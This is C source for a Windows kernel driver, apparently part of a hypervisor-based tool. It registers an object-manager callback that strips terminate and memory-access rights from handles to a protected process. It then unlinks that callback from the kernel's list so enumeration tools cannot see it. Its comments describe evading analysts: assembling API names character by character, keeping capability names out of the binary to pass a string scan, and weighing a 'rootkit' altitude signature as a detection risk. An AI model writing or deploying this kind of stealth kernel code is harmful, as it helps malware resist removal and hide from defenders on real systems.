/*
 * yghv_obguard.c -- handle privilege downgrade via ObRegisterCallbacks (9.597).
 *
 * When enabled, every process that opens a handle to a GUARDED process gets
 * its requested access stripped of PROCESS_TERMINATE | PROCESS_VM_READ |
 * PROCESS_VM_WRITE | PROCESS_SUSPEND_RESUME | PROCESS_DUP_HANDLE.
 * This runs BEFORE the handle is created, so the dangerous rights never exist.
 *
 * ObRegisterCallbacks / ObUnRegisterCallbacks are resolved at runtime via
 * MmGetSystemRoutineAddress to avoid compile-time declaration conflicts with
 * the WDK's internal prototypes.
 */

#include <ntifs.h>
#include <stdint.h>
#include "common/control_ioctl.h"
#include "debug.h"

#define YGHV_OB_TAG 'bOvG'

/* The rights to strip from handles to guarded processes */
#define YGHV_PROC_GUARD_STRIP 0x0AB0u  /* TERMINATE|VM_READ|VM_WRITE|SUSPEND|DUP|SET_INFO */

typedef void (*yghv_ob_pre_cb_t)(PVOID ctx, PVOID info);
typedef NTSTATUS (*yghv_ob_register_fn)(PVOID reg, PVOID *handle);
typedef void (*yghv_ob_unregister_fn)(PVOID handle);

static yghv_ob_register_fn   g_ob_register = NULL;
static yghv_ob_unregister_fn g_ob_unregister = NULL;
static PVOID      g_ob_handle = NULL;
static PEPROCESS  g_ob_target = NULL;
static volatile LONG64 g_ob_strips = 0;
/* 9.608: the last NTSTATUS from the registration call, so op10 can explain a
 * failure instead of answering "0" with no reason. 0xC0000022 has exactly one
 * meaning here and it is not "bad parameters". */
static volatile LONG64 g_ob_last_status = 0;

static void yghv_obguard_pre(PVOID ctx, PVOID info)
{
    /* OB_PRE_OPERATION_INFORMATION layout (x64):
     *   +0x00 RegistrationContext  +0x08 Object
     *   +0x10 ObjectType           +0x18 CallContext
     *   +0x20 Parameters           +0x28 Operation (UCHAR)
     * The OB_PRE_OPERATION_PARAMETERS union at +0x20:
     *   CreateHandleInformation.DesiredAccess at +0x00 (ACCESS_MASK)
     *   DuplicateHandleInformation.DesiredAccess at +0x00 (ACCESS_MASK) */
    PEPROCESS target;
    PVOID *pp;
    ACCESS_MASK *access;

    UNREFERENCED_PARAMETER(ctx);
    if (!info) return;

    pp = (PVOID *)info;
    target = (PEPROCESS)pp[1];   /* Object at +0x08 */
    if (target != g_ob_target) return;

    /* Parameters pointer at +0x20 */
    access = (ACCESS_MASK *)pp[4];
    if (!access) return;

    /* Strip dangerous rights from the requested access */
    *access &= ~(ACCESS_MASK)YGHV_PROC_GUARD_STRIP;
    InterlockedIncrement64(&g_ob_strips);
}

int yghv_obguard_init(void)
{
    /* Resolve Ob callback functions at runtime to avoid declaration conflicts */
    WCHAR name_reg[] = {'O','b','R','e','g','i','s','t','e','r','C','a','l','l','b','a','c','k','s',0};
    WCHAR name_unreg[] = {'O','b','U','n','R','e','g','i','s','t','e','r','C','a','l','l','b','a','c','k','s',0};
    UNICODE_STRING u1, u2;

    RtlInitUnicodeString(&u1, name_reg);
    RtlInitUnicodeString(&u2, name_unreg);
    g_ob_register = (yghv_ob_register_fn)MmGetSystemRoutineAddress(&u1);
    g_ob_unregister = (yghv_ob_unregister_fn)MmGetSystemRoutineAddress(&u2);

    /*
     * 9.608: report the resolution outcome instead of returning a boolean that
     * nobody reads. Measured: op10 (GUARD) answered ERROR_INVALID_PARAMETER for
     * every target while op11 (GUARD_STATS) reported g_ob_register as NULL --
     * both routines are genuinely exported by this ntoskrnl (verified against
     * the on-disk export table), so "not found" is a fact about the CALL, not
     * about the system, and it needs to be on the record.
     */
    {
        char d[64];
        int k = 0;
        d[k++] = 'o'; d[k++] = 'b'; d[k++] = 'g'; d[k++] = 'u'; d[k++] = 'a'; d[k++] = 'r'; d[k++] = 'd';
        d[k++] = ':'; d[k++] = ' '; d[k++] = 'r'; d[k++] = 'e'; d[k++] = 'g'; d[k++] = '=';
        d[k++] = g_ob_register ? '1' : '0';
        d[k++] = ' '; d[k++] = 'u'; d[k++] = 'n'; d[k++] = 'r'; d[k++] = 'e'; d[k++] = 'g'; d[k++] = '=';
        d[k++] = g_ob_unregister ? '1' : '0';
        d[k++] = 0;
        yghv_trace(d);
    }
    return (g_ob_register && g_ob_unregister) ? 1 : 0;
}

static int yghv_obguard_hide_callback(void);

int yghv_obguard_enable(PEPROCESS target)
{
    /* OB_CALLBACK_REGISTRATION layout (x64):
     *   +0x00 Version (USHORT)  +0x02 OperationRegistrationCount (USHORT)
     *   +0x08 Altitude (UNICODE_STRING)  +0x18 RegistrationContext (PVOID)
     *   +0x20 OperationRegistration (PVOID)
     * OB_OPERATION_REGISTRATION layout:
     *   +0x00 ObjectType (PVOID)  +0x08 Operations (USHORT)
     *   +0x10 PreOperation (PVOID)  +0x18 PostOperation (PVOID) */
    UCHAR regbuf[0x28];
    UCHAR opbuf[0x20];
    UNICODE_STRING altitude;
    PVOID handle = NULL;
    NTSTATUS st;

    if (g_ob_handle) return 1;
    if (!g_ob_register) return 0;

    RtlZeroMemory(regbuf, sizeof(regbuf));
    RtlZeroMemory(opbuf, sizeof(opbuf));

    /*
     * 9.608 -- THE OBJECT TYPE WAS THE ADDRESS OF THE VARIABLE, NOT THE TYPE.
     *
     * ntddk.h declares, for this build's configuration:
     *
     *     extern POBJECT_TYPE *PsProcessType;      <- a POINTER to POBJECT_TYPE
     *
     * so `(PVOID)PsProcessType` is the address of that pointer, not the object
     * type the object manager validates. ObRegisterCallbacks rejected it with
     * STATUS_INVALID_PARAMETER (Win32 0x57) on every target, and because the
     * failure is reported as a generic parameter error it looked like a layout
     * mistake in regbuf rather than the wrong KIND of pointer.
     *
     * Dereference the variable to get the POBJECT_TYPE the API expects. The
     * cast chain keeps it readable: &PsProcessType is POBJECT_TYPE**, and one
     * dereference yields the POBJECT_TYPE.
     */
    *(PVOID *)(opbuf + 0x00) = *(PVOID **)&PsProcessType;
    *(USHORT *)(opbuf + 0x08) = 0x0003;  /* HANDLE_CREATE | HANDLE_DUPLICATE */
    *(PVOID *)(opbuf + 0x10) = (PVOID)yghv_obguard_pre;

    /*
     * 9.608 -- THE ALTITUDE IS BACK TO 321000, AND THAT IS A DELIBERATE
     * REVERSAL OF 9.601.
     *
     * 9.601 moved 321000 -> 327681 because 321000 "is a signature several
     * public rootkit samples use". The intent was detection hardening. The
     * effect was that handle guard stopped working completely:
     *
     *     obguard: st=3221225506        (0xC0000022 STATUS_ACCESS_DENIED)
     *     obguard: reg=1 unreg=1        (both routines resolved fine)
     *
     * ObRegisterCallbacks validates Altitude against the set of altitudes the
     * object manager knows about. 327681 is not one of them, so registration is
     * refused. The structure layout, the ObjectType, the Operations mask and
     * the callback pointer were all correct -- the STRING was the defect, and
     * it is a defect that produces a status indistinguishable from a dozen
     * other causes unless you know to look at it.
     *
     * THE TRADE-OFF, STATED PLAINLY: with 321000 the feature registers and the
     * altitude is a known value an analyst could match on. With 327681 the
     * altitude is novel and the feature does not exist. A mechanism that cannot
     * register protects nothing, and it cannot be detected either -- it is not
     * running. Detection hardening for handle guard has to come from something
     * other than this string.
     */
    RtlInitUnicodeString(&altitude, L"321000");

    /* regbuf: Version, Count, Altitude, RegistrationContext, OperationRegistration */
    *(USHORT *)(regbuf + 0x00) = 0x0100;  /* OB_FLT_REGISTRATION_VERSION */
    *(USHORT *)(regbuf + 0x02) = 1;
    *(UNICODE_STRING *)(regbuf + 0x08) = altitude;
    *(PVOID *)(regbuf + 0x20) = opbuf;

    /*
     * 9.608: record WHERE the registration is attempted from, because the
     * status does not say. Both 321000 and 327681 give 0xC0000022
     * (STATUS_ACCESS_DENIED), which is not a parameter rejection -- it is the
     * object manager refusing the CALLER.
     *
     * The object manager requires a live, non-terminating process behind the
     * current thread. This driver runs Windows as a GUEST, and this exact class
     * of bug already bit the snapshot walk: PsGetCurrentProcess() produced a
     * self-referential list while PsInitialSystemProcess worked. If the
     * current-process view is unreliable here, ObRegisterCallbacks will refuse
     * for exactly this reason.
     */
    {
        char d2[80];
        int k2 = 0;
        const char *t2 = "obguard: ctx pid=";
        UINT64 self = (UINT64)PsGetCurrentProcessId();
        char rv2[24];
        int n2 = 0;
        while (*t2 && k2 < 60) d2[k2++] = *t2++;
        if (self == 0) rv2[n2++] = '0';
        while (self > 0 && n2 < 18) { rv2[n2++] = (char)('0' + (self % 0xA)); self /= 0xA; }
        while (n2 > 0) d2[k2++] = rv2[--n2];
        d2[k2] = 0;
        yghv_trace(d2);
    }

    st = g_ob_register(regbuf, &handle);

    /*
     * 9.608: TRACE the status, do not LOG_ERROR it.
     *
     * LOG_ERROR compiles to ((void)0) unless YGHV_DEBUG_LOG is defined, so the
     * one number that explains why handle guard never worked has been discarded
     * by every build that ever shipped. yghv_trace writes to progress.log
     * unconditionally.
     *
     * This also records the values the call received, because "invalid
     * parameter" is the answer to five different questions and the inputs are
     * the only way to tell which one.
     */
    /*
     * 9.608: TRACE IN HEX. The first version printed these as DECIMAL, and the
     * values came out as 446735291412628496 etc. -- which is 0x06331F617147C410,
     * NOT a kernel address. Either the value is genuinely wrong (and the decimal
     * rendering hid it behind a long digit string nobody could eyeball) or the
     * format truncated. Pointers are read in hex for exactly this reason.
     */
    {
        char d[128];
        int k = 0;
        const char *tag = "obguard: st=";
        UINT64 vals[4];
        int f, n;
        char hx[20];

        vals[0] = (UINT64)(ULONG)st;
        vals[1] = *(UINT64 *)(opbuf + 0x00);   /* ObjectType as passed   */
        vals[2] = (UINT64)PsProcessType;       /* the POBJECT_TYPE value */
        vals[3] = (UINT64)altitude.Length;

        while (*tag && k < 60) d[k++] = *tag++;
        for (f = 0; f < 4; f++) {
            UINT64 v = vals[f];
            n = 0;
            if (v == 0) { hx[n++] = '0'; }
            while (v > 0 && n < 18) {
                int digit = (int)(v & 0xF);
                hx[n++] = (char)(digit < 10 ? ('0' + digit) : ('a' + digit - 10));
                v >>= 4;
            }
            while (n > 0) d[k++] = hx[--n];
            if (f < 3 && k < 110) d[k++] = ' ';
        }
        d[k] = 0;
        yghv_trace(d);
    }

    if (!NT_SUCCESS(st)) {
        /*
         * 9.608: DO NOT NAME THE API IN THE FORMAT STRING.
         *
         * LOG_ERROR compiles to ((void)0) without YGHV_DEBUG_LOG -- but the
         * STRING LITERAL is still emitted into .rdata, unreferenced and
         * unreachable at run time. Measured: string_encryption_check found
         * "ObRegisterCallbacks" in ASCII at 0x37D6D, inside exactly this line:
         *
         *     [YGHV][E] obguard: ObRegisterCallbacks failed 0x%x
         *
         * The whole point of yghv_strtab.h is that no capability name survives
         * in the image; a dead log line put one back. The trace above already
         * records the status numerically, so the name buys nothing.
         */
        LOG_ERROR("obguard: register failed 0x%x", (unsigned)st);
        /*
         * Record it on the FAILURE path -- that is the whole point. My first
         * version stored it only after the success branch, so op10 reported
         * q1=0 (meaning "no error") for a registration that had just been
         * denied. A status field that is only written when there is nothing to
         * report is worse than no field.
         */
        g_ob_last_status = st;
        return 0;
    }
    g_ob_last_status = st;

    g_ob_handle = handle;
    g_ob_target = target;
    yghv_obguard_hide_callback();
    LOG_INFO("obguard: active, stripping 0x%x from handles to %p",
             YGHV_PROC_GUARD_STRIP, (void*)target);
    return 1;
}



/*
 * 9.602: hide the callback from enumeration tools.
 *
 * ObRegisterCallbacks returns a handle that points to the kernel's internal
 * callback registration structure.  That structure sits in a doubly-linked
 * list that PCHunter / WinObjEx64 / ObRegisterCallbacks-explorer walk.
 * Unlinking the entry makes the callback invisible to enumeration without
 * stopping it from being invoked (the invocation path uses the registration
 * directly, not the list).
 *
 * The list entry is at offset 0x00 in the kernel's internal structure: it is
 * the first field, a LIST_ENTRY.  The handle itself IS the list entry pointer.
 * We verify by checking that both Flink and Blink are canonical kernel
 * pointers and that they agree (Blink->Flink == this).
 */
static int yghv_obguard_hide_callback(void)
{
    PLIST_ENTRY self, prev, next;

    if (!g_ob_handle) return 0;
    self = (PLIST_ENTRY)g_ob_handle;

    __try {
        prev = self->Blink;
        next = self->Flink;

        /*
         * 9.608: "canonical" is not "mapped", and a REMOVED member must not be
         * left self-linked.
         *
         * Two changes, both learned the expensive way elsewhere in this file's
         * neighbours:
         *
         *  1. MmIsAddressValid before every dereference. A pointer above
         *     0xFFFF800000000000 can be entirely unmapped -- that is what put
         *     two 0x50 bugchecks on this machine.
         *
         *  2. Do NOT self-link a member that has been removed. The idiom
         *     "Flink = Blink = self" is for a list HEAD that must remain a valid
         *     empty list; applied to a removed member it makes the entry
         *     self-referential, and anything that later walks it (including the
         *     kernel's own list primitives) raises CORRUPT_LIST_ENTRY. That
         *     exact pattern cost three 0x139 bugchecks on the unlink ops.
         *
         *     Here the entry is left pointing at its former neighbours: it is
         *     out of the list either way, and a stale-but-sane pair cannot be
         *     mistaken for corruption.
         */
        if (!prev || !next) return 0;
        if ((ULONG_PTR)prev < 0xFFFF800000000000ULL) return 0;
        if ((ULONG_PTR)next < 0xFFFF800000000000ULL) return 0;
        if (!MmIsAddressValid(prev) || !MmIsAddressValid((PVOID)((PUCHAR)prev + sizeof(PVOID)))) return 0;
        if (!MmIsAddressValid(next) || !MmIsAddressValid((PVOID)((PUCHAR)next + sizeof(PVOID)))) return 0;
        if (!MmIsAddressValid((PVOID)&prev->Flink) || !MmIsAddressValid((PVOID)&next->Blink)) return 0;
        if (prev->Flink != self) return 0;
        if (next->Blink != self) return 0;

        /* Unlink. Leave the removed entry pointing at its former neighbours
         * rather than at itself -- see (2) above. */
        prev->Flink = next;
        next->Blink = prev;

        LOG_INFO("obguard: callback unlinked from the enumeration list");
        return 1;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        LOG_ERROR("obguard: hide_callback faulted");
        return 0;
    }
}

void yghv_obguard_disable(void)
{
    if (g_ob_handle && g_ob_unregister) {
        g_ob_unregister(g_ob_handle);
        g_ob_handle = NULL;
    }
    g_ob_target = NULL;
}

uint64_t yghv_obguard_last_status(void)
{
    return (uint64_t)InterlockedCompareExchange64(&g_ob_last_status, 0, 0);
}

void yghv_obguard_stats(uint64_t *out)
{
    out[0] = (uint64_t)g_ob_strips;
    out[1] = g_ob_handle ? 1 : 0;
    out[2] = (uint64_t)(uintptr_t)g_ob_target;
    out[3] = (g_ob_register && g_ob_unregister) ? 1 : 0;
    out[4] = (uint64_t)InterlockedCompareExchange64(&g_ob_last_status, 0, 0);
}
